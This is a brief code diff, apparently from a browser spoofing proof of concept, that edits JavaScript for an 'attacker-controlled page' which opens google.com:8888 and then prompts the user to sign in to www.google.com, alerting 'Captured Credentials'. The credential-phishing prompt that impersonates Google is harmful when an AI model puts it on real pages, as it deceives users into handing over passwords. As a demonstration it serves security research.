@@ -32,9 +32,9 @@
           <p>This is an attacker-controlled page rendering custom HTML.</p>
         </div>
       `;
-      let win = window.open('https://google.com:8888', '_top
+      let win = window.open('https://google.com:8888', '_top');
       setTimeout(() => {
-        let user = prompt('Sign into your account in order to access www.google.com', 'Enter E-mail / Password');
+        let user = prompt('Sign into your account in order to access www.google.com', 'Enter Your E-mail / Password');
         if (user) {
           alert('Captured Credentials: ' + user);
         }
